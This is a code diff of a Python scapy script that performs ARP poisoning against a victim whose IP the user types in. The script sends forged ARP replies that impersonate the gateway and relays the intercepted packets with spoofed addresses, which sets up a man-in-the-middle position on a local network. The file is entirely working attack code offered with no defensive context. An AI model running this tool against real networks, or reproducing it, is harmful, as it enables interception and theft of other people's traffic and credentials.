@@ -9,99 +9,49 @@ import time
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
 from scapy.all import *
 
+myMAC = 0
+victimMAC = 0
+myIP = 0
+victimIP = 0
+gatewayIP = 0
+gatewayMAC = 0
+
 class arp_poison(threading.Thread):
-	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
-		threading.Thread.__init__(self)
-		self.myMAC = _myMAC
-		self.victimMAC = _victimMAC
-		self.myIP = _myIP
-		self.victimIP = _victimIP
-		self.gatewayIP = _gatewayIP
-		self.gatewayMAC = _gatewayMAC
 
 	def run(self):
+		global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
 		while(True):
 				# Malicious ARP packet send			
-			sendp(Ether(dst=self.victimMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.gatewayIP, pdst=self.victimIP, hwsrc=self.myMAC, hwdst=self.victimMAC), count=3)
-#			sendp(Ether(dst=self.gatewayMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.victimIP, pdst=self.gatewayIP, hwsrc=self.myMAC, hwdst=self.gatewayMAC), count=3)
-			time.sleep(3)
+			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3)
+#			sendp(Ether(dst=gatewayMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=victimIP, pdst=gatewayIP, hwsrc=myMAC, hwdst=gatewayMAC), count=3)
+			time.sleep(1)
 
 
+def relay(packet):
+	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
+	p = packet[0]
+	ether_type = str(hex(p[Ether].type))
+	p[Ether].dst = gatewayMAC
+	p[Ether].src = victimMAC
+	if ether_type == '0x800':
+		p[IP].src = victimIP
+	sendp(p)
 
-
+def relay_victim(packet):
+	pass
 
 class to_gateway(threading.Thread):
-	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
-		threading.Thread.__init__(self)
-		self.myMAC = _myMAC
-		self.victimMAC = _victimMAC
-		self.myIP = _myIP
-		self.victimIP = _victimIP
-		self.gatewayIP = _gatewayIP
-		self.gatewayMAC = _gatewayMAC
-		self.ethlen = len(Ether())
-		self.iplen = len(IP())
-		self.PROTOCOL_ICMP = 1
-		self.PROTOCOL_TCP = 6
-		self.PROTOCOL_UDP = 17
-
 	def run(self):
 		while(True):
-			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)
-			protocol = binascii.hexlify(str(sn[0]))[46:48]
-			e = sn[0]
-			t = str(e)
-			eth = Ether(t[:self.ethlen])
-			ip = IP(t[self.ethlen:])
-			if int(protocol) == self.PROTOCOL_TCP:
-				tcp = TCP(t[self.ethlen+self.iplen:])
-#				pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/tcp
-				pkt = Ether(dst=self.gatewayMAC, src=self.victimMAC)/IP(src=ip.src, dst=ip.dst)/tcp
-			
-			elif int(protocol) == self.PROTOCOL_UDP:	
-				udp = UDP(t[self.ethlen+self.iplen:])
-#				pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/udp
-				pkt = Ether(dst=self.gatewayMAC, src=self.victimMAC)/IP(src=ip.src, dst=ip.dst)/udp
-			else: continue
-			sendp(pkt)
-
-
+			sniff(prn=relay, count=1)
 
 class to_victim(threading.Thread):
-	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
-		threading.Thread.__init__(self)
-		self.myMAC = _myMAC
-		self.victimMAC = _victimMAC
-		self.myIP = _myIP
-		self.victimIP = _victimIP
-		self.gatewayIP = _gatewayIP
-		self.gatewayMAC = _gatewayMAC
-		self.ethlen = len(Ether())
-		self.iplen = len(IP())
-		self.PROTOCOL_ICMP = 1
-		self.PROTOCOL_TCP = 6
-		self.PROTOCOL_UDP = 17
-
 	def run(self):
 		while(True):
-			sn2 = sniff(filter="(ether src host " + self.gatewayMAC + ") and (ether dst host " + self.myMAC + ") and (ip dst host " + self.victimIP + ")", count=1)
-			protocol =  binascii.hexlify(str(sn2[0]))[46:48]
-			e = sn2[0]
-			t = str(e)
-			eth = Ether(t[:self.ethlen])
-			ip = IP(t[self.ethlen:])
-			if int(protocol) == self.PROTOCOL_TCP:
-				tcp = TCP(t[self.ethlen+self.iplen:])
-				pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=self.victimIP)/tcp
-			
-			elif int(protocol) == self.PROTOCOL_UDP:
-				udp = UDP(t[self.ethlen+self.iplen:])
-				pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=self.victimIP)/udp
-
-			else: continue
-			sendp(pkt)
+			pass
 
 def main():
+	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
 	victimIP = raw_input("[*] Please enter the victim's IP >> ")
 	ok = re.findall("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", victimIP)		# VictimIP validation check
 	if not(ok):
@@ -140,8 +90,8 @@ def main():
 			print "Error occured! Can't load the victimMAC. : " + str(e)
 			sys.exit(1)
 
-	tArp = arp_poison(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
-	tGateway = to_gateway(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
+	tArp = arp_poison()
+	tGateway = to_gateway()
 #	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
 
 	tArp.start()
